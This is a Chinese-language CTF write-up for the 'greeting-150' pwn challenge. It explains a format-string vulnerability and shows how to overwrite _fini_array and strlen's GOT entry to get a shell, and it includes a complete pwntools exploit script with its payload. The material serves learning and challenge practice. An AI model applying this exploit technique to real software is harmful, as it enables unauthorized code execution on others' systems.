# greeting-150

# 涉及知识

+ 格式化漏洞
+ _fini_array修改

<!--more-->

# 程序分析

## 保护机制

![image.png](https://i.loli.net/2020/05/20/o1ZvqMn6PXRzpsF.png)

保护开启了Canary和NX

## 漏洞分析

![image.png](https://i.loli.net/2020/05/20/h5caQC9nqoi8jl1.png)

漏洞很明显，在箭头处存在字符串漏洞，我们可以实现任意地址修改。但是程序没有循环，我们在修改完一次后，程序就会结束。所以我们需要使程序重新从main处开始执行。

当main函数执行完毕后，会执行_fini_array中的函数，所以可以利用字符串漏洞将_fini_array中写入main入口地址，如此程序就可以再次进入main。那么当我们把strlen的got表修改为system的plt表后，只需要输入/bin/sh就可以获得shell

# EXP

````python
from pwn import *
from LibcSearcher import LibcSearcher
# context.log_level='debug'
sh=process('./xctf')
#sh=remote('111.198.29.45',34936)
elf=ELF('./xctf')
strlen_got=elf.got['strlen']
print hex(strlen_got)
init_fini=0x08049934

#strlen_got ==> system_plt
payload='a'*2+p32(init_fini+2)+p32(strlen_got+2)+p32(strlen_got)+p32(init_fini)
payload+='%2016c%12$hn%13$hn'+'%31884c%14$hn'+'%349c%15$hn'

sh.sendlineafter('name...',payload)
sh.sendline('/bin/sh')
sh.interactive()
````

## 反思

+ 最开始尝试修改strlen的plt表，程序一直存在异常，最后发现是plt表没有写权限。

+ EXP中是将strlen的got表写为system的plt表，但是如果写为system的got表则不成功。这里有一点疑惑，看来得把程序员的自我修养认真看一下。

## 参考

[CSDN](https://blog.csdn.net/qq_42728977/article/details/102880186)
